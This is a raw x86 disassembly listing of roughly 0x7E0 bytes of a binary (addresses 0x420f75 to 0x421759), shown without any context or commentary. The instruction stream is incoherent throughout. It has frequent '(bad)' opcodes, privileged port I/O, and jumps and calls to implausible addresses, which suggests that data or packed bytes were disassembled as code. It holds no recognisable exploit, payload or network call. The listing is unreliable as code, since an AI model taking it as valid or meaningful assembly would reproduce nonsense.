  420f75:	loop   0x420f12
  420f77:	add    al,0xb9
  420f79:	mov    bl,0xca
  420f7b:	lods   eax,DWORD PTR ds:[esi]
  420f7c:	popa   
  420f7d:	pop    edi
  420f7e:	jbe    0x420f4d
  420f80:	stos   BYTE PTR es:[edi],al
  420f81:	adc    al,0x3a
  420f83:	or     al,0x31
  420f85:	fcom   QWORD PTR [esi+edi*2+0x5c]
  420f89:	std    
  420f8a:	pop    esp
  420f8b:	in     al,dx
  420f8c:	xchg   ebx,eax
  420f8d:	dec    ebp
  420f8e:	sub    ebx,DWORD PTR [ebx+0x3e7f67d2]
  420f94:	pop    ss
  420f95:	js     0x420fd2
  420f97:	sbb    eax,0xcb2d7852
  420f9c:	xchg   edi,eax
  420f9d:	cmp    eax,0x7d658953
  420fa2:	(bad)  
  420fa3:	mov    edx,0x73947a1e
  420fa8:	sbb    al,0xe1
  420faa:	mov    bh,0x1e
  420fac:	fwait
  420fad:	push   esp
  420fae:	popf   
  420faf:	push   esp
  420fb0:	xor    bh,BYTE PTR [eax]
  420fb2:	adc    cl,dl
  420fb4:	xor    BYTE PTR [eax],al
  420fb6:	js     0x42100a
  420fb8:	gs stos BYTE PTR es:[edi],al
  420fba:	jne    0x421007
  420fbc:	in     eax,0x39
  420fbe:	aad    0x65
  420fc0:	jmp    0x420fa2
  420fc2:	(bad)  
  420fc3:	cmp    al,0xfc
  420fc5:	pop    ebx
  420fc6:	cmp    al,0x11
  420fc8:	test   eax,0x39d86726
  420fcd:	outs   dx,BYTE PTR ds:[esi]
  420fce:	ss enter 0x7b12,0x18
  420fd3:	xchg   esp,eax
  420fd4:	mov    dl,0xbc
  420fd6:	sbb    al,0x47
  420fd8:	mov    ch,0x3
  420fda:	mov    ah,0x10
  420fdc:	mov    al,ds:0x2673712f
  420fe1:	test   al,0x23
  420fe3:	es push eax
  420fe5:	add    ch,BYTE PTR [ebx-0x54]
  420fe8:	push   ss
  420fe9:	loope  0x42105a
  420feb:	lock mov ah,0xa1
  420fee:	pop    edx
  420fef:	(bad)  
  420ff0:	cmp    BYTE PTR [ebp+0x20],0xc7
  420ff4:	and    dh,dh
  420ff6:	fs inc ebp
  420ff8:	inc    esi
  420ff9:	jge    0x421072
  420ffb:	xor    eax,0xdc614c67
  421000:	mov    eax,0x66e727ba
  421005:	mov    BYTE PTR [eax-0x38],ah
  421008:	ins    BYTE PTR es:[edi],dx
  421009:	hlt    
  42100a:	fwait
  42100b:	popa   
  42100c:	fstp   QWORD PTR [esp+ebx*8]
  42100f:	sub    al,0xea
  421011:	icebp  
  421012:	cmp    cl,dh
  421014:	add    BYTE PTR [edx+0x7],dl
  421017:	push   ebx
  421018:	ret    
  421019:	push   ds
  42101a:	and    DWORD PTR [edi],ebp
  42101c:	push   es
  42101d:	aas    
  42101e:	into   
  42101f:	lods   al,BYTE PTR ds:[esi]
  421020:	je     0x421039
  421022:	aas    
  421023:	fs sub eax,0xc360fa36
  421029:	sbb    ebx,esp
  42102b:	stc    
  42102c:	sub    eax,0xae9151e
  421031:	xor    esi,ebp
  421033:	sub    al,0x2a
  421035:	repz xchg esi,eax
  421037:	in     eax,0x68
  421039:	push   ebx
  42103a:	sbb    ch,BYTE PTR [esp+ebp*1+0x7a]
  42103e:	mov    dl,bl
  421040:	or     al,0xa9
  421042:	(bad)  
  421043:	jmp    0x421031
  421045:	add    DWORD PTR [ebx+0xb],edx
  421048:	repz ficomp WORD PTR [eax+0x1a889cb]
  42104f:	and    cl,BYTE PTR [eax-0x32792823]
  421055:	and    DWORD PTR [edi+0x73],edi
  421058:	push   cs
  421059:	lods   al,BYTE PTR ds:[esi]
  42105a:	jb     0x421078
  42105c:	popf   
  42105d:	mov    ebp,0x25784a3b
  421062:	cmp    ebx,DWORD PTR [edx-0x7bcb1403]
  421068:	sbb    dl,bh
  42106a:	stos   DWORD PTR es:[edi],eax
  42106b:	daa    
  42106c:	mov    edi,0x6ff5114b
  421071:	lea    ebx,[ebp+0x3a9909cf]
  421077:	pop    eax
  421078:	stos   DWORD PTR es:[edi],eax
  421079:	ret    0x8fe9
  42107c:	mov    esi,0x237af8e1
  421081:	xchg   edx,eax
  421082:	addr16 jle 0x4210cd
  421085:	xchg   ebp,eax
  421086:	cmp    ecx,DWORD PTR [ebp+0x30294dd1]
  42108c:	sbb    ebx,ecx
  42108e:	in     eax,0x16
  421090:	iret   
  421091:	inc    ecx
  421092:	push   edi
  421093:	mov    bl,BYTE PTR [edx]
  421095:	aaa    
  421096:	push   0x15
  421098:	out    0x65,eax
  42109a:	sub    eax,0xa297174d
  42109f:	push   esi
  4210a0:	cmp    eax,0xcbb6d519
  4210a5:	dec    edi
  4210a6:	xor    bl,0xda
  4210a9:	jno    0x42105f
  4210ab:	rcl    DWORD PTR [ebx+edi*2+0xd],0x5e
  4210b0:	into   
  4210b1:	sbb    DWORD PTR [esi-0x2f98d1b],0x6abb0a05
  4210bb:	into   
  4210bc:	mov    ah,0x8
  4210be:	mov    ch,0xb3
  4210c0:	add    al,0x6f
  4210c2:	push   cs
  4210c3:	mov    esp,0x94c1bc92
  4210c8:	push   ss
  4210c9:	test   DWORD PTR [ecx+eax*8],0x2c48505d
  4210d0:	cwde   
  4210d1:	add    DWORD PTR [eax],esi
  4210d3:	mov    edx,0xfeee2a16
  4210d8:	mov    esp,0x266daee8
  4210dd:	mov    bl,0x54
  4210df:	or     ecx,edx
  4210e1:	lock jno 0x4210a7
  4210e4:	jo     0x4210de
  4210e6:	inc    edi
  4210e7:	ficomp DWORD PTR [esi-0x72b7fc96]
  4210ed:	mov    ebp,0x182d73e1
  4210f2:	stos   DWORD PTR es:[edi],eax
  4210f3:	xchg   BYTE PTR [ebp+0x19],bh
  4210f6:	or     BYTE PTR [eax],dl
  4210f8:	sub    ecx,DWORD PTR [edi-0x7a]
  4210fb:	dec    esi
  4210fc:	into   
  4210fd:	addr16 jl 0x4210db
  421100:	xchg   ebx,eax
  421101:	inc    eax
  421102:	clc    
  421103:	mov    ds:0x496d90e1,eax
  421108:	addr16 fadd st,st(6)
  42110b:	loop   0x421169
  42110d:	xchg   ebp,ebp
  42110f:	fld    QWORD PTR [edx+0x72ba4e29]
  421115:	mov    al,dh
  421117:	mov    esi,0xf5
  42111c:	mov    al,0xe3
  42111e:	pop    edx
  42111f:	jecxz  0x42117c
  421121:	sti    
  421122:	mov    ecx,0x72415ff3
  421127:	test   edi,ebx
  421129:	push   0x8ccd42b3
  42112e:	add    DWORD PTR [eax],eax
  421130:	test   DWORD PTR [edx],eax
  421132:	add    BYTE PTR [eax],al
  421134:	push   ebp
  421135:	addr16 push cs
  421137:	into   
  421138:	jle    0x421128
  42113a:	mov    ecx,DWORD PTR [ebx+0x4b]
  42113d:	rcr    BYTE PTR [edx],1
  42113f:	sbb    BYTE PTR [esp+edx*2],0xbe
  421143:	jnp    0x4210eb
  421145:	mov    ebx,0xb513efa1
  42114a:	call   0x440e:0xbb94d1ea
  421151:	pusha  
  421152:	outs   dx,BYTE PTR ds:[esi]
  421153:	int3   
  421154:	cli    
  421155:	mov    WORD PTR [esi+0x3e5f8588],es
  42115b:	mov    esi,0x7af824f
  421160:	push   ss
  421161:	push   ds
  421162:	in     al,dx
  421163:	test   BYTE PTR [eax+0x30281cab],bl
  421169:	ret    0x93d2
  42116c:	sub    al,0x6d
  42116e:	push   eax
  42116f:	push   eax
  421170:	clc    
  421171:	in     al,0x4e
  421173:	mov    esi,DWORD PTR [ebp-0xeacb9df]
  421179:	pop    es
  42117a:	clc    
  42117b:	mov    edx,0xe5a0a507
  421180:	lods   eax,DWORD PTR ds:[esi]
  421181:	nop
  421182:	dec    ebx
  421183:	push   ecx
  421184:	mov    ds,WORD PTR [esi]
  421186:	push   edx
  421187:	scas   eax,DWORD PTR es:[edi]
  421188:	cwde   
  421189:	not    DWORD PTR [edi+ebx*8-0x2fd47be]
  421190:	mov    cl,0xe5
  421192:	popf   
  421193:	or     BYTE PTR [ecx+eiz*2-0x9],dh
  421197:	fistp  DWORD PTR [ebp*4+0x143f9627]
  42119e:	add    dl,cl
  4211a0:	lock sub eax,0xa5afa332
  4211a6:	pushf  
  4211a7:	add    BYTE PTR [edx],bh
  4211a9:	and    dh,0x5c
  4211ac:	and    BYTE PTR [ebx],ch
  4211ae:	xor    eax,0xb7e8265a
  4211b3:	cli    
  4211b4:	mov    ebx,0xb57f103e
  4211b9:	test   DWORD PTR [ebp-0x14],0x4927ae05
  4211c0:	aaa    
  4211c1:	lds    edx,FWORD PTR [edx]
  4211c3:	in     al,dx
  4211c4:	(bad)  
  4211c5:	lock pop esi
  4211c7:	fstp   DWORD PTR [eax]
  4211c9:	mov    eax,DWORD PTR [edi]
  4211cb:	div    BYTE PTR [edi+0x46]
  4211ce:	loop   0x421245
  4211d0:	xchg   ebp,eax
  4211d1:	retf   
  4211d2:	push   ebx
  4211d3:	mov    edi,0x15338681
  4211d8:	cmp    DWORD PTR [ecx-0x679ec622],esp
  4211de:	mov    BYTE PTR [ecx-0x1e0620b1],dl
  4211e4:	(bad)  
  4211e5:	ss aad 0x8b
  4211e8:	push   ebx
  4211e9:	add    eax,0x587ed17f
  4211ee:	pop    eax
  4211ef:	mov    edx,0x5cf26580
  4211f4:	mov    ecx,0x12b2b65
  4211f9:	mov    eax,ds:0x9a66edcd
  4211fe:	mov    bh,0xf5
  421200:	aam    0xbc
  421202:	push   cs
  421203:	add    eax,0xbae35c55
  421208:	or     al,0x55
  42120a:	jge    0x4211b6
  42120c:	das    
  42120d:	sbb    ch,0x97
  421210:	mov    WORD PTR [edx],?
  421212:	daa    
  421213:	or     eax,0xaec2d6f6
  421218:	push   edx
  421219:	jb     0x421214
  42121b:	fsub   st,st(3)
  42121d:	cmp    BYTE PTR ds:0x2441d38,0x3f
  421224:	loopne 0x421240
  421226:	scas   eax,DWORD PTR es:[edi]
  421227:	test   DWORD PTR [ebx+0x742c2fa1],ebx
  42122d:	ds in  al,0xfc
  421230:	repz loope 0x4211e9
  421233:	iret   
  421234:	rcr    BYTE PTR [edx],1
  421236:	repnz add DWORD PTR [edi-0x70],ecx
  42123a:	jl     0x4211d1
  42123c:	sub    DWORD PTR [edi-0x76],0x9fbdf294
  421243:	push   ebp
  421244:	mov    dh,0x6d
  421246:	jp     0x4211f2
  421248:	jne    0x42128a
  42124a:	(bad)  
  42124b:	loopne 0x42120f
  42124d:	or     DWORD PTR [eax-0x7b],ebp
  421250:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421251:	lock test eax,0xe80b8cd
  421257:	scas   eax,DWORD PTR es:[edi]
  421258:	mov    al,ds:0x265e9dd
  42125d:	mov    esi,0xf9bb2f50
  421262:	imul   edi,edi,0x11c288f
  421268:	cmp    ah,BYTE PTR [edi+eiz*8+0x21]
  42126c:	imul   DWORD PTR [esi-0x3d2c6602]
  421272:	adc    dh,ch
  421274:	dec    ebp
  421275:	mov    ds:0x7050ab60,eax
  42127a:	mov    edx,DWORD PTR [ecx+0x48]
  42127d:	out    0x59,al
  42127f:	inc    ebx
  421280:	sbb    DWORD PTR [ebx+ebp*8+0x17],edi
  421284:	fbstp  TBYTE PTR [ebx+0x37]
  421287:	fstp   DWORD PTR [edi-0x46]
  42128a:	inc    ebp
  42128b:	arpl   WORD PTR [ecx+0xcd82d8d],bx
  421291:	adc    DWORD PTR ds:0xfba975b8,eax
  421297:	jae    0x4212fd
  421299:	add    DWORD PTR [eax],ebx
  42129b:	outs   dx,BYTE PTR ds:[esi]
  42129c:	pop    edx
  42129d:	jp     0x42122f
  42129f:	mov    ecx,0xf42d6542
  4212a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4212a5:	dec    esi
  4212a6:	div    BYTE PTR [ecx]
  4212a8:	lods   eax,DWORD PTR ds:[esi]
  4212a9:	dec    ecx
  4212aa:	out    dx,eax
  4212ab:	(bad)  
  4212ac:	cli    
  4212ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4212ae:	xor    al,0xd
  4212b0:	(bad)  
  4212b1:	loopne 0x4212e0
  4212b3:	and    ebx,DWORD PTR [ebp-0x2d]
  4212b6:	aad    0x47
  4212b8:	push   esp
  4212b9:	ss mov edi,0xb8b1f114
  4212bf:	out    0x44,eax
  4212c1:	dec    ebp
  4212c2:	jmp    0x756e132
  4212c7:	fs jmp 0xef9ba858
  4212cd:	jo     0x4212be
  4212cf:	add    esi,DWORD PTR [ecx]
  4212d1:	test   DWORD PTR [ebx-0x75eef23f],ebp
  4212d7:	or     eax,0xaef43e61
  4212dc:	xor    ecx,0x91584595
  4212e2:	dec    edi
  4212e3:	jmp    0x42134c
  4212e5:	adc    ch,bl
  4212e7:	fcmovnb st,st(5)
  4212e9:	lea    eax,[edi+0x2cb8a91e]
  4212ef:	out    0xf9,eax
  4212f1:	push   es
  4212f2:	jno    0x421280
  4212f4:	stos   BYTE PTR es:[edi],al
  4212f5:	mov    ecx,0x522a65d5
  4212fa:	js     0x42128e
  4212fc:	inc    eax
  4212fd:	aad    0x98
  4212ff:	push   ss
  421300:	add    BYTE PTR [ecx],al
  421302:	ins    BYTE PTR es:[edi],dx
  421303:	sub    BYTE PTR [esi-0x532596c0],cl
  421309:	cmc    
  42130a:	dec    eax
  42130b:	push   es
  42130c:	push   edi
  42130d:	pop    es
  42130e:	out    dx,al
  42130f:	xchg   ebp,eax
  421310:	inc    edi
  421311:	out    dx,eax
  421312:	cmp    DWORD PTR ds:0x753b8dcf,0x34c32894
  42131c:	cmp    BYTE PTR fs:[ebx],0xdc
  421320:	xchg   DWORD PTR [ebp+edi*8+0x15a0d6ab],edx
  421327:	xchg   DWORD PTR ds:0xcf65820f,edx
  42132d:	or     esp,DWORD PTR [edi]
  42132f:	ds lock push ebp
  421332:	mov    dh,BYTE PTR [ebp+0x65]
  421335:	mov    edx,0x9a6068b5
  42133a:	cld    
  42133b:	xchg   ecx,eax
  42133c:	add    eax,0xf365332b
  421341:	xchg   ebx,eax
  421342:	scas   eax,DWORD PTR es:[edi]
  421343:	pop    es
  421344:	sub    bh,BYTE PTR ds:0xe2e3f743
  42134a:	push   esp
  42134b:	pop    esp
  42134c:	mov    al,0x94
  42134e:	fldcw  WORD PTR [edi-0x18ae1b50]
  421354:	cdq    
  421355:	in     al,dx
  421356:	sbb    DWORD PTR [edx],ebp
  421358:	mov    bl,0xbd
  42135a:	xchg   BYTE PTR [ecx-0x49],bl
  42135d:	inc    esp
  42135e:	jbe    0x42138e
  421360:	pop    ecx
  421361:	scas   eax,DWORD PTR es:[edi]
  421362:	cmp    eax,0x5c7639a1
  421367:	or     bh,BYTE PTR [ecx+0x4871e4bd]
  42136d:	inc    ebx
  42136e:	cwde   
  42136f:	(bad)  
  421370:	outs   dx,BYTE PTR ds:[esi]
  421371:	ret    
  421372:	imul   edi,DWORD PTR [eax+edi*1],0x74161087
  421379:	dec    ebx
  42137a:	dec    esi
  42137b:	in     al,dx
  42137c:	jle    0x42132e
  42137e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42137f:	add    DWORD PTR [esi-0x57d1a027],ebx
  421385:	push   cs
  421386:	lea    eax,[esi-0x37]
  421389:	fstp   DWORD PTR [ebp-0x2e04f2ae]
  42138f:	sahf   
  421390:	iret   
  421391:	sbb    bh,ch
  421393:	jo     0x4213dc
  421395:	in     al,0x35
  421397:	jecxz  0x4213ea
  421399:	cmp    eax,0xd0d80110
  42139e:	adc    al,0x1c
  4213a0:	adc    eax,0x959f8ab9
  4213a5:	loopne 0x421358
  4213a7:	add    esi,edi
  4213a9:	jmp    0xcd1a7c12
  4213ae:	stc    
  4213af:	mov    edx,0x40104256
  4213b4:	jle    0x421425
  4213b6:	pusha  
  4213b7:	inc    edi
  4213b8:	cld    
  4213b9:	add    BYTE PTR [eax],al
  4213bb:	add    BYTE PTR ds:0xbf06168e,dh
  4213c1:	sahf   
  4213c2:	xor    eax,0xa0e807bf
  4213c7:	mov    edx,0xbe485c6
  4213cc:	push   edx
  4213cd:	pop    DWORD PTR [ecx]
  4213cf:	add    BYTE PTR [ebp+0x4a000002],al
  4213d5:	js     0x4213a6
  4213d7:	cmp    DWORD PTR [ebx+0x11c646e2],esp
  4213dd:	add    DWORD PTR [eax-0x62],edx
  4213e0:	jecxz  0x4213e7
  4213e2:	pop    edx
  4213e3:	dec    ebx
  4213e4:	inc    edi
  4213e5:	repz jns 0x4213ea
  4213e8:	cmp    edx,DWORD PTR [ecx]
  4213ea:	jno    0x42136d
  4213ec:	push   0x1b993633
  4213f1:	fist   DWORD PTR [edi-0x4e497b38]
  4213f7:	ss call 0xf4e8627e
  4213fd:	pop    ds
  4213fe:	cmp    ah,dl
  421400:	iret   
  421401:	xlat   BYTE PTR ds:[ebx]
  421402:	ss mov cl,0xde
  421405:	mov    al,ds:0x2ae48b14
  42140a:	and    DWORD PTR [eax],esi
  42140c:	mov    BYTE PTR [esi],ch
  42140e:	xchg   DWORD PTR [ebx],edx
  421410:	xchg   esi,eax
  421412:	fsubr  QWORD PTR [ecx]
  421414:	dec    ebp
  421415:	push   es
  421416:	loop   0x421480
  421418:	add    BYTE PTR [ebp+0x1e],bl
  42141b:	sub    al,0x60
  42141d:	adc    DWORD PTR [esi+0x1052a13b],esi
  421423:	stc    
  421424:	and    eax,0x35363900
  421429:	in     eax,0x67
  42142b:	mov    cs,WORD PTR [ebp+eax*8+0x4e1be11b]
  421432:	cmc    
  421433:	mov    dh,0x29
  421435:	jp     0x42141d
  421437:	out    0x2,al
  421439:	lea    edi,ss:[ebp+0x44]
  42143d:	lods   al,BYTE PTR ds:[esi]
  42143e:	out    0xc7,eax
  421440:	nop
  421441:	out    0xb3,al
  421443:	idiv   ah
  421445:	outs   dx,BYTE PTR ds:[esi]
  421446:	jecxz  0x421494
  421448:	and    edi,DWORD PTR [esi+0x43]
  42144b:	dec    ecx
  42144c:	out    0xcb,eax
  42144e:	sub    al,0x19
  421450:	enter  0x4bc6,0x7a
  421454:	sub    DWORD PTR [edx+0x6a0c9ab9],ebp
  42145a:	push   esp
  42145b:	stos   BYTE PTR es:[edi],al
  42145c:	nop    ecx
  42145f:	push   0xe48d5497
  421464:	xor    DWORD PTR [ecx-0x5a7b3dae],edx
  42146a:	out    dx,al
  42146b:	push   ds
  42146c:	ja     0x4214c0
  42146e:	das    
  42146f:	xor    BYTE PTR ds:0x6f41ead3,cl
  421475:	nop
  421476:	dec    edx
  421477:	dec    ecx
  421478:	push   ebx
  421479:	push   ecx
  42147a:	push   cs
  42147b:	nop
  42147c:	scas   eax,DWORD PTR es:[edi]
  42147d:	call   0x7be52bf1
  421482:	or     DWORD PTR [esi],ecx
  421484:	lock (bad) 
  421486:	call   0x5ec111d6
  42148b:	cmp    BYTE PTR [ebx+0x48f8fa1e],0xc7
  421492:	sub    al,0x93
  421494:	popa   
  421495:	sbb    edx,DWORD PTR [eax-0x5]
  421498:	xlat   BYTE PTR ds:[ebx]
  421499:	xor    BYTE PTR [edi-0x738b6e54],dl
  42149f:	adc    al,0xc2
  4214a1:	or     eax,0x2c112182
  4214a6:	mov    al,0x81
  4214a8:	mov    WORD PTR [edi+0x36d25041],ss
  4214ae:	retfw  0x39d1
  4214b2:	(bad)  
  4214b3:	repnz inc esp
  4214b5:	mov    BYTE PTR [esi+0x30],dh
  4214b8:	mov    al,ds:0x5b190948
  4214bd:	int3   
  4214be:	ja     0x421521
  4214c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4214c1:	test   eax,0xef5b45ad
  4214c6:	shl    DWORD PTR [eax],cl
  4214c8:	stc    
  4214c9:	ds dec esp
  4214cb:	mov    BYTE PTR [eax],ah
  4214cd:	xchg   ebp,eax
  4214ce:	mov    WORD PTR [ecx+ebx*2],fs
  4214d1:	and    ah,bl
  4214d3:	or     esp,esi
  4214d5:	vpmacssdql xmm10,xmm5,XMMWORD PTR [edx+0x722988a7],xmm6
  4214df:	(bad)  
  4214e0:	adc    edx,ecx
  4214e2:	or     eax,0x58aef52c
  4214e7:	or     edi,DWORD PTR [ebx+0x5059306f]
  4214ed:	xchg   DWORD PTR [edi+0x1e7ead76],esi
  4214f3:	aad    0xa6
  4214f5:	mov    dh,0xe5
  4214f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4214f8:	lds    ecx,FWORD PTR [edx+0x17011566]
  4214fe:	popa   
  4214ff:	stos   BYTE PTR es:[edi],al
  421500:	(bad)  
  421501:	and    al,0x7d
  421503:	mov    al,0x1f
  421505:	in     eax,dx
  421506:	mov    ?,WORD PTR [edx]
  421508:	xor    DWORD PTR [edi+ebp*2+0x17],0x77e133fb
  421510:	in     eax,0x76
  421512:	inc    edi
  421513:	pop    edx
  421514:	pop    edx
  421515:	push   ebp
  421516:	mov    al,0x28
  421518:	mov    esi,0xdf16ca60
  42151d:	hlt    
  42151e:	dec    eax
  42151f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421520:	in     al,0x2b
  421522:	retf   0x6acd
  421525:	aam    0xa3
  421527:	cmp    esi,DWORD PTR [ecx+0x4c]
  42152a:	mov    ds:0x82718795,al
  42152f:	push   0xf190b238
  421534:	jge    0x42152e
  421536:	inc    ch
  421538:	out    dx,al
  421539:	push   eax
  42153a:	scas   al,BYTE PTR es:[edi]
  42153b:	outs   dx,DWORD PTR ds:[esi]
  42153c:	pop    ds
  42153d:	loop   0x4214fd
  42153f:	push   ecx
  421540:	mov    bh,0xe
  421542:	jmp    0x8b46af84
  421547:	in     eax,0x32
  421549:	fxch   st(5)
  42154b:	add    ch,ch
  42154d:	or     cl,bl
  42154f:	dec    esp
  421550:	cmp    BYTE PTR [edx+0x60],ah
  421553:	fld    DWORD PTR [ebp+ecx*4-0x44c3e07a]
  42155a:	sbb    BYTE PTR [ebx-0x71],bh
  42155d:	lock lods eax,DWORD PTR gs:[esi]
  421560:	pop    esi
  421561:	xor    bh,BYTE PTR [ebx]
  421563:	cmp    DWORD PTR [ecx+0x58],0x831f4a89
  42156a:	repz push ds
  42156c:	cs xchg edi,eax
  42156e:	pop    esi
  42156f:	test   al,0xd1
  421571:	pop    ss
  421572:	(bad)  [eax-0x612da2f8]
  421578:	mov    ch,0xc4
  42157a:	shl    DWORD PTR [ecx-0x1a],0x7d
  42157e:	xchg   esi,eax
  42157f:	repz sub BYTE PTR [edi],bh
  421582:	jae    0x421524
  421584:	out    0x3f,al
  421586:	xlat   BYTE PTR ds:[ebx]
  421587:	xchg   cl,bl
  421589:	dec    esp
  42158a:	xchg   ebx,eax
  42158b:	mov    eax,0xbc835d51
  421590:	in     eax,dx
  421591:	stc    
  421592:	cmp    eax,DWORD PTR [ebx+0x5039bd0c]
  421598:	or     eax,0xe91307e9
  42159d:	fs (bad) 
  4215a1:	enter  0x5ed4,0x3c
  4215a5:	mov    dh,0xb4
  4215a7:	iret   
  4215a8:	adc    al,ch
  4215aa:	and    DWORD PTR [ecx+ebx*8],0xffffffb2
  4215ae:	jle    0x4215d0
  4215b0:	cmc    
  4215b1:	mov    ebx,0x2a349ee6
  4215b6:	mov    cs,WORD PTR [edx+ebx*2-0x60]
  4215ba:	xor    ebp,ecx
  4215bc:	leave  
  4215bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4215be:	repz fimul DWORD PTR [edi+0x49ba3fd]
  4215c5:	je     0x42159a
  4215c7:	scas   al,BYTE PTR es:[edi]
  4215c8:	loope  0x421635
  4215ca:	fiadd  WORD PTR [ebp-0x61b2fdc6]
  4215d0:	xchg   ecx,eax
  4215d1:	call   ebx
  4215d3:	and    bl,dl
  4215d5:	sbb    ah,BYTE PTR [esi+0x41]
  4215d8:	inc    ecx
  4215d9:	jae    0x421602
  4215db:	mov    esi,0x5ccce4c9
  4215e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4215e1:	jo     0x4215da
  4215e3:	mov    ecx,esp
  4215e5:	sbb    ch,BYTE PTR [ebp-0x58]
  4215e8:	or     ecx,DWORD PTR [eax+0x34b9eaa8]
  4215ee:	test   BYTE PTR [ebx],dh
  4215f0:	push   esp
  4215f1:	ss push 0x42
  4215f4:	cmp    eax,DWORD PTR [ebx]
  4215f6:	cdq    
  4215f7:	inc    edi
  4215f8:	jge    0x42163a
  4215fa:	shl    DWORD PTR [ebx+0x2],0x88
  4215fe:	jns    0x4215a4
  421600:	dec    edi
  421601:	xchg   esi,eax
  421602:	and    dh,BYTE PTR [edi-0x23]
  421605:	mul    esp
  421607:	adc    DWORD PTR [ecx+edx*2+0x7bbe9de7],ebp
  42160e:	or     bl,cl
  421610:	nop
  421611:	jmp    0x44ca0e6e
  421616:	and    esi,DWORD PTR [esi]
  421618:	dec    esi
  421619:	loopne 0x421646
  42161b:	pop    esp
  42161c:	jmp    0x4672:0x7c49cbe7
  421623:	pushf  
  421624:	sub    ebx,ecx
  421626:	and    BYTE PTR ds:0x613b7715,bl
  42162c:	jo     0x421636
  42162e:	test   eax,0x5dddc834
  421633:	(bad)  
  421634:	aad    0xa
  421636:	dec    edi
  421637:	mov    bl,0xb2
  421639:	xor    bh,dl
  42163b:	and    ecx,esp
  42163d:	xchg   edi,eax
  42163e:	cmp    al,0x2
  421640:	(bad)  
  421641:	cmp    eax,DWORD PTR [eax-0x762b6235]
  421647:	pushf  
  421648:	fsubr  DWORD PTR [edx+0x3ad1e185]
  42164e:	and    bh,BYTE PTR [edi]
  421650:	xlat   BYTE PTR ds:[ebx]
  421651:	push   esi
  421652:	leave  
  421653:	dec    edx
  421654:	loope  0x4216a4
  421656:	aaa    
  421657:	repnz test BYTE PTR [eax],0x0
  42165b:	add    cl,bh
  42165d:	std    
  42165e:	in     eax,dx
  42165f:	mov    cl,0xed
  421661:	mov    cl,0xfd
  421663:	std    
  421664:	pop    ds
  421665:	xor    dl,0xed
  421668:	cli    
  421669:	ret    
  42166a:	jne    0x42166a
  42166c:	xlat   BYTE PTR ds:[ebx]
  42166d:	xchg   ecx,eax
  42166e:	add    DWORD PTR [eax],eax
  421670:	test   DWORD PTR [edx],eax
  421672:	add    BYTE PTR [eax],al
  421674:	test   eax,0x8841bbf0
  421679:	cmp    al,0x44
  42167b:	mov    eax,edx
  42167d:	cli    
  42167e:	jg     0x4216aa
  421680:	scas   al,BYTE PTR es:[edi]
  421681:	push   esp
  421682:	rcl    dl,0x5d
  421685:	cmp    ebp,esp
  421687:	in     eax,dx
  421688:	add    esi,DWORD PTR [eax+edx*8-0x37c73605]
  42168f:	fisubr WORD PTR [edi]
  421691:	ret    0xb222
  421694:	cld    
  421695:	push   ecx
  421696:	cs sahf 
  421698:	mov    edi,0xf889d8c4
  42169d:	test   al,0x60
  42169f:	jle    0x42162b
  4216a1:	out    0x37,al
  4216a3:	(bad)  
  4216a4:	dec    ebx
  4216a5:	xchg   ecx,eax
  4216a6:	xor    edx,DWORD PTR [edx+0x76]
  4216a9:	iret   
  4216aa:	push   ebp
  4216ab:	jno    0x4216e6
  4216ad:	jb     0x421670
  4216af:	popa   
  4216b0:	xchg   ebp,eax
  4216b1:	je     0x421650
  4216b3:	clc    
  4216b4:	adc    eax,0x3e0908d4
  4216b9:	dec    ebp
  4216ba:	push   cs
  4216bb:	jo     0x421718
  4216bd:	cli    
  4216be:	cld    
  4216bf:	fdivr  st(3),st
  4216c1:	icebp  
  4216c2:	xlat   BYTE PTR ds:[ebx]
  4216c3:	in     al,0x7e
  4216c5:	mov    WORD PTR [ebx],cs
  4216c7:	cmp    ch,bh
  4216c9:	jle    0x421740
  4216cb:	jmp    0x6917ea45
  4216d0:	sbb    BYTE PTR [edx+0x247e1454],ch
  4216d6:	and    dh,cl
  4216d8:	imul   edx,DWORD PTR [edx+0x61a1b6a1],0x4
  4216df:	mov    edi,0x33d3e715
  4216e4:	enter  0x2aff,0xa5
  4216e8:	dec    ebx
  4216e9:	push   esi
  4216ea:	add    BYTE PTR [esi+eax*2],0xa5
  4216ee:	mov    ah,0x8e
  4216f0:	fs jmp 0x1cdd561e
  4216f6:	inc    edi
  4216f7:	mov    esp,0x7c8fd5af
  4216fc:	jecxz  0x421695
  4216fe:	ret    
  4216ff:	add    al,0x7f
  421701:	loope  0x4216b8
  421703:	jo     0x42172e
  421705:	xchg   esi,eax
  421706:	loope  0x421727
  421708:	loop   0x4216e0
  42170a:	outs   dx,DWORD PTR ds:[esi]
  42170b:	ss out 0x2d,eax
  42170e:	xchg   ebp,eax
  42170f:	xor    BYTE PTR [ebx],bh
  421711:	push   edi
  421712:	aas    
  421713:	mov    edx,DWORD PTR cs:[esi]
  421716:	mov    cl,0x7a
  421718:	pop    ss
  421719:	scas   eax,DWORD PTR es:[edi]
  42171a:	or     cl,BYTE PTR [ecx+0x51]
  42171d:	sub    DWORD PTR [edx],esi
  42171f:	hlt    
  421720:	es jnp 0x4216b6
  421723:	cmp    cl,BYTE PTR [esi]
  421725:	sub    ah,BYTE PTR [esi-0x3e6a0660]
  42172b:	add    ah,ah
  42172d:	dec    ecx
  42172e:	scas   al,BYTE PTR es:[edi]
  42172f:	repnz imul DWORD PTR [esi]
  421732:	repz jne 0x42171c
  421735:	rol    DWORD PTR [esi-0x2f],1
  421738:	or     edx,DWORD PTR [esi-0x56]
  42173b:	fcmove st,st(6)
  42173d:	ret    
  42173e:	mov    bh,0x24
  421740:	sbb    ah,bl
  421742:	dec    ebx
  421743:	mov    ah,0x5d
  421745:	lods   al,BYTE PTR ds:[esi]
  421746:	sbb    BYTE PTR [edx],ch
  421748:	inc    eax
  421749:	les    edx,FWORD PTR [ebx-0x7]
  42174c:	jo     0x42172f
  42174e:	or     al,0x8f
  421750:	cwde   
  421751:	mov    edi,0x4474ed1c
  421756:	push   0x7
  421758:	push   cs
  421759:	ret    
